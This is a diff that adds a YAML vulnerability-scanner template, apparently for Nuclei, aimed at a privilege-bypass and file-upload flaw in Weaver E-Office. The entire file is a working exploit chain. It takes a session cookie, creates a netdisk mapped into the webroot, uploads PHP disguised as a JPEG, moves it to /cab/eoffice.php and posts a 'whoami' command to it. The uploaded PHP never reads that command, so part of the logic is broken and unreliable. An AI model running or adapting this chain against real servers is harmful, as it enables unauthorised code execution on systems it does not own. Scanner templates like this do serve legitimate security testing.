@@ -1,0 +1,142 @@
+id: weaver-eoffice-file-upload
+
+info:
+  name: Weaver E-Office File Overwrite and Privilege Bypass
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Weaver E-Office has a privilege bypass vulnerability allowing attackers to bypass privilege verification and upload arbitrary files to obtain server control permissions.
+  tags: file-upload, privilege-bypass
+
+variables:
+  cmd: "whoami"
+
+flow: |
+  http(1) && http(2) && http(3) && http(4) && http(5) && http(6) && http(7)
+
+http:
+  - id: fetch-session-cookie
+    method: GET
+    path:
+      - "/sample.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: session_cookie
+        internal: true
+        part: header
+        regex:
+          - "Set-Cookie: PHPSESSID=(.*?); path=/"
+
+  - id: create-disk
+    method: POST
+    path:
+      - "/general/system/netdisk/new/submit.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "{{session_cookie}}"
+    body: "DISK_NAME=eoffice&DISK_PATH=D:/eoffice/webroot/cab&DISK_TYPE=1&DEPT_ID=0"
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - id: fetch-disk-id
+    method: GET
+    path:
+      - "/general/system/netdisk/index.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: disk_id
+        internal: true
+        part: body
+        regex:
+          - "edit.php\\?DISK_ID=(.*?)\">"
+
+  - id: upload-file
+    method: POST
+    path:
+      - "/inc/jquery/uploadify/uploadify.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary70AcDBrh15OE0Fd0
+      Accept: "*/*"
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Connection: close
+    body: |
+      ------WebKitFormBoundary70AcDBrh15OE0Fd0
+      Content-Disposition: form-data; name="name"
+
+      1.jpg
+      ------WebKitFormBoundary70AcDBrh15OE0Fd0
+      Content-Disposition: form-data; name="Filedata"; filename="1.jpg"
+      Content-Type: image/jpeg
+
+      <?php echo md5(233);unlink(__FILE__);?>
+      ------WebKitFormBoundary70AcDBrh15OE0Fd0--
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: filename
+        internal: true
+        part: body
+        regex:
+          - "(?s)(.*)"
+
+  - id: trigger-file-upload
+    method: GET
+    path:
+      - "/module/OC_NETDISK/upload_OC.php?DISK_ID={{disk_id}}&fichier=eoffice.php&ATTACHMENT=D:/eoffice/webroot/attachment/{{filename}}/1.jpg"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "eoffice.php"
+        part: body
+
+  - id: execute-command
+    method: POST
+    path:
+      - "/cab/eoffice.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "cmd={{cmd}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: output
+        part: body
+        regex:
+          - "(?s)(.*)"
+
+  - id: delete-disk
+    method: GET
+    path:
+      - "/general/system/netdisk/delete.php?DISK_ID={{disk_id}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: status
+        status:
+          - 302
